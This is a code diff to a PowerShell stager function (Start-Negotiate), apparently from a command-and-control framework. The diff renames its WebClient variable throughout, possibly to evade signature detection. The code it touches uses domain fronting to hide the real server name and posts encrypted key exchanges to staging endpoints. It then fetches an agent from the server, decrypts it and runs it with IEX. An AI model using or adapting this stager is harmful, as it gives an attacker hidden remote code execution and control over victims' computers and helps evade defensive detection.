@@ -106,15 +106,15 @@ function Start-Negotiate {
 
     # if the web client doesn't exist, create a new web client and set appropriate options
     #   this only happens if this stager.ps1 code is NOT called from a launcher context
-    if(-not $wc) {
-        $wc=New-Object System.Net.WebClient;
+    if(-not $talk) {
+        $talk=New-Object System.Net.WebClient;
         # set the proxy settings for the WC to be the default system settings
-        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+        $talk.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+        $talk.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
     }
 
     if ($Script:Proxy) {
-        $wc.Proxy = $Script:Proxy;   
+        $talk.Proxy = $Script:Proxy;   
     }
 
     
@@ -127,11 +127,11 @@ function Start-Negotiate {
 	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
 	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
 	    if ($headerKey -eq "host"){
-                try{$ig=$WC.DownloadData($s)}catch{}};
-            $wc.Headers.Add($headerKey, $headerValue);
+                try{$ig=$talk.DownloadData($s)}catch{}};
+            $talk.Headers.Add($headerKey, $headerValue);
         }
     }
-    $wc.Headers.Add("User-Agent",$UA);
+    $talk.Headers.Add("User-Agent",$UA);
     
     # RC4 routing packet:
     #   sessionID = $ID
@@ -145,7 +145,7 @@ function Start-Negotiate {
     $rc4p = $IV + $rc4p + $eb;
 
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
-    $raw=$wc.UploadData($s+"/{{ stage_1 }}","POST",$rc4p);
+    $raw=$talk.UploadData($s+"/{{ stage_1 }}","POST",$rc4p);
 
     # step 4 of negotiation -> server returns RSA(nonce+AESsession))
     $de=$e.GetString($rs.decrypt($raw,$false));
@@ -229,15 +229,15 @@ function Start-Negotiate {
 	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
 	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
 	    if ($headerKey -eq "host"){
-                try{$ig=$WC.DownloadData($s)}catch{}};
-            $wc.Headers.Add($headerKey, $headerValue);
+                try{$ig=$talk.DownloadData($s)}catch{}};
+            $talk.Headers.Add($headerKey, $headerValue);
         }
     }
-    $wc.Headers.Add("User-Agent",$UA);
-    $wc.Headers.Add("Hop-Name",$hop);
+    $talk.Headers.Add("User-Agent",$UA);
+    $talk.Headers.Add("Hop-Name",$hop);
 
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
-    $raw=$wc.UploadData($s+"/{{ stage_2 }}", "POST", $rc4p2);
+    $raw=$talk.UploadData($s+"/{{ stage_2 }}", "POST", $rc4p2);
 
     # # decrypt the agent and register the agent logic
     # $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
@@ -245,7 +245,7 @@ function Start-Negotiate {
     IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
 
     # clear some variables out of memory and cleanup before execution
-    $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
+    $AES=$null;$s2=$null;$talk=$null;$eb2=$null;$raw=$null;$IV=$null;$talk=$null;$i=$null;$ib2=$null;
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
